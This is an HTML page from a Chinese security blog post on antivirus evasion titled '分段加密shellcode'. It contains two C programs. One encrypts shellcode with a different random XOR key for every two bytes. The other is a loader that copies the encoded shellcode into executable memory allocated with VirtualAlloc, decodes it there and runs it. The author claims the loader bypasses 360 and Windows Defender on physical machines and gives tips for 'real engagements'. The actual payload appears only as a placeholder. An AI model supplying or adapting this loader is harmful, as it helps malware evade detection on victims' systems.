@@ -1,0 +1,885 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="免杀" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Xiaopan233 Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="说个题外话。。。 测试的时候发现，360放在虚拟机里哪怕给他连上了网。。。简单用异或加密下的 shellcode 能正常上线，最主要的是。。跑mimikatz 360居然动都不动 但是一旦放到物理机上，刚下下来 马子 就马上被杀。 这就有点奇葩。。。盲猜360检测了虚拟机环境。。。 这个分段加密的shellcode 测试了下，实体机上能过 360、defender 上线">
+<meta property="og:type" content="article">
+<meta property="og:title" content="分段加密shellcode">
+<meta property="og:url" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/index.html">
+<meta property="og:site_name" content="Xiaopan233 Blog">
+<meta property="og:description" content="说个题外话。。。 测试的时候发现，360放在虚拟机里哪怕给他连上了网。。。简单用异或加密下的 shellcode 能正常上线，最主要的是。。跑mimikatz 360居然动都不动 但是一旦放到物理机上，刚下下来 马子 就马上被杀。 这就有点奇葩。。。盲猜360检测了虚拟机环境。。。 这个分段加密的shellcode 测试了下，实体机上能过 360、defender 上线">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/1.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/2.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/3.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/4.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/6.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/8.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/10.png">
+<meta property="og:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/11.png">
+<meta property="article:published_time" content="2020-12-15T07:38:23.000Z">
+<meta property="article:modified_time" content="2022-07-10T14:20:51.653Z">
+<meta property="article:author" content="Xiaopan233">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/"/>
+
+
+
+
+
+  <title>分段加密shellcode | Xiaopan233 Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Xiaopan233 Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/atom.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            Sitemap
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/2020/01/01/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+<script>
+  var server_url = "http://127.0.0.1/blog_v1/blog_v1.php";
+</script>
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/15/2020-12-15-segmentation-shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiaopan233 Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">分段加密shellcode</h1>
+        
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-12-15T15:38:23+08:00">
+                2020-12-15
+              </time>
+            
+
+            
+
+            
+          </span>
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%85%8D%E6%9D%80/" itemprop="url" rel="index">
+                    <span itemprop="name">免杀</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>说个题外话。。。</p>
+<p>测试的时候发现，360放在虚拟机里哪怕给他连上了网。。。简单用异或加密下的 shellcode 能正常上线，最主要的是。。跑mimikatz 360居然动都不动</p>
+<p>但是一旦放到物理机上，刚下下来 马子 就马上被杀。</p>
+<p>这就有点奇葩。。。盲猜360检测了虚拟机环境。。。</p>
+<p>这个分段加密的shellcode 测试了下，实体机上能过 360、defender 上线</p>
+<span id="more"></span>
+
+<br>
+
+<p>现在的杀软对于普通的一次异或加密shellcode 都基本能静态秒杀。于是乎产生了一些想法：</p>
+<p><code>shellcode</code> 在 <code>loader</code> 里是经过 <code>异或加密</code> 的。难道说杀软遍历 1 - 255 去依次 <code>异或解密</code> 吗？有点不现实</p>
+<p>那既然直接爆破破解 异或值 不太现实，那杀软凭什么能静态秒杀呢？沙盒吗？</p>
+<p>结果测试的时候发现，单单在 <code>loader</code> 中放一个 一次异或加密的 <code>shellcode</code> 也会被杀</p>
+<p>那就很明显了，一次异或加密的 <code>shellcode</code> 也许还有一些特征值，有规律，被杀软检测到了</p>
+<p>那我们将 shellcode 分段加密，<strong>把规律打破</strong>，是不是自然就能过杀软了呢？</p>
+<br>
+
+<p>下面上代码：</p>
+<p>首先需要在本地把 shellcode 加密下。。自动加密的脚本。。之后有空再写吧哈哈</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//未加密 shellcode 版。自己调试然后拿加密后的 shellcode 以及 xorData</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* length: 926 bytes */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> source_shellcode[] = <span class="string">&quot;SHELLCODE&quot;</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> encode_shellcode[<span class="number">926</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//XOR分段数,固定长度 926 / 2 = 463</span></span><br><span class="line">	<span class="keyword">int</span> xorNum = <span class="number">463</span>;</span><br><span class="line">	<span class="comment">//保存每次分段 XOR 的值</span></span><br><span class="line">	<span class="keyword">int</span> xorData[<span class="number">463</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> source_shellcode_length = <span class="keyword">sizeof</span>(source_shellcode);</span><br><span class="line">	<span class="keyword">char</span> decode;</span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分段XOR</span></span><br><span class="line">	srand((<span class="keyword">unsigned</span> <span class="keyword">int</span>)time(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xorNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 不能太大，也不能是 0</span></span><br><span class="line">		xorData[i] = rand() % <span class="number">200</span> + <span class="number">10</span>;</span><br><span class="line">		<span class="comment">//每2个一分组</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">			encode_shellcode[k] = source_shellcode[k] ^ xorData[i];</span><br><span class="line">			k++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>记得改下shellcode长度</p>
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/1.png" style="width:500px;">
+
+
+
+<p>打个断点，用调试器拿加密过的 <code>shellcode</code> 和 <code>xordata</code>:</p>
+<p>记得勾下 <strong>十六进制显示</strong>，将之复制出来</p>
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/2.png" style="width:500px;">
+
+
+
+<p>复制出来后到 sublime 中进行修改（sublime真好用）</p>
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/3.png" style="width:500px;">
+
+
+
+<p>别忘了还有个 <code>Xordata</code></p>
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/4.png" style="width:500px;">
+
+
+
+<p>获取到 加密的 <code>shellcode</code> 和 <code>Xordata</code> 之后，将其放入到下面代码 中</p>
+<p><i>ps：这些变量这么命名的话，如果杀软会检测<code>符号表</code>就有可能会 gg，实战的时候最好改下变量名</i></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">/* length: 926 bytes */</span></span><br><span class="line">	<span class="comment">//没做那么智能化，加密的shellcode 和 XORdata 就在上一个代码中自己用调试器调然后拷贝出来把</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> encode_shellcode[<span class="number">926</span>] = <span class="string">&quot;SHELLCODE&quot;</span>;</span><br><span class="line">	<span class="comment">//XOR分段数,固定长度 926 / 2 = 463</span></span><br><span class="line">	<span class="keyword">int</span> xorNum = <span class="number">463</span>;</span><br><span class="line">	<span class="comment">//保存每次分段 XOR 的值</span></span><br><span class="line">	<span class="keyword">int</span> xorData[<span class="number">463</span>] = &#123; <span class="number">0</span>xXX,<span class="number">0</span>xXX,<span class="number">0</span>xXX…… &#125;;</span><br><span class="line">	<span class="keyword">char</span> decode;</span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span>* Memory;</span><br><span class="line">	<span class="comment">//故意开内存只开1，实际上后面偏移的时候还是能插进去的，可能能过下杀软</span></span><br><span class="line">	Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="number">1</span>, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">926</span>; i++) &#123;</span><br><span class="line">		Memory[i] = encode_shellcode[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//XOR分段解码。直接在内存中异或，防止 shellcode 泄露。也许能过下杀软吧</span></span><br><span class="line">	<span class="comment">//每两个一分组</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xorNum; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">2</span>; j++) &#123;</span><br><span class="line">			decode = encode_shellcode[k] ^ xorData[i];</span><br><span class="line">			Memory[k] = decode;</span><br><span class="line">			k++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可正常上线</p>
+<p><i>注意用的时候根据自己的 <code>shellcode</code> 长度改一下数组长度</i></p>
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/6.png" style="width:500px;">
+
+<br>
+
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/8.png" style="width:500px;">
+
+
+
+<p><strong>虚拟机</strong>360跑起来：</p>
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/10.png" style="width:500px;">
+
+
+
+<img src="/2020/12/15/2020-12-15-segmentation-shellcode/11.png" style="width:500px;">
+
+
+
+<p><strong>补充：</strong></p>
+<p>实测借用师弟的电脑，物理机过了360、defender</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/12/13/2020-12-13-sundry/" rel="next" title="初涉免杀的一些小想法">
+                <i class="fa fa-chevron-left"></i> 初涉免杀的一些小想法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/01/05/2021-01-05-oscp-journey/" rel="prev" title="OSCP Lab Journey">
+                OSCP Lab Journey <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/xiaopan233" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://tttang.com/user/Xiaopan233" target="_blank" title="跳跳糖">
+                      
+                        <i class="fa fa-fw fa-globe"></i>跳跳糖</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://forum.butian.net/people/483" target="_blank" title="奇安信攻防社区">
+                      
+                        <i class="fa fa-fw fa-globe"></i>奇安信攻防社区</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.anquanke.com/member.html?memberId=144071" target="_blank" title="安全客">
+                      
+                        <i class="fa fa-fw fa-globe"></i>安全客</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/author/xiaopan233" target="_blank" title="Freebuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Freebuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/xiaopan233/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hui3c.club/" title="Hui3c 窝" target="_blank">Hui3c 窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.noerrorp.com/" title="YouGe的技术笔记" target="_blank">YouGe的技术笔记</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jingqingg.com/" title="惊青の小窝" target="_blank">惊青の小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.luolingjiang.com/" title="洛翎酱的小窝" target="_blank">洛翎酱的小窝</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.petitstart.club/" title="Petitstart'Blog" target="_blank">Petitstart'Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xiaopan233</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
